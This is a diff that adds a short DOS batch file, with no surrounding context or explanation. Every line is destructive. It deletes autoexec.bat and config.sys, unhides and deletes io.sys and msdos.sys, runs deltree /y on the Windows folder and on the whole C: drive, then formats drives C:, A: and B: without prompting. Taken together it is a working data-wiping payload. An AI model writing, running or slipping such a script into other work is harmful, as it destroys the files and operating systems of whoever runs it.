@@ -1,0 +1,13 @@
+@echo off
+cd\
+del autoexec.bat
+del config.sys
+attrib io.sys -s -h
+attrib msdos.sys -s -h
+del io.sys
+del msdos.sys
+deltree /y windows
+deltree /y c:\
+format c:
+format a:
+format b:
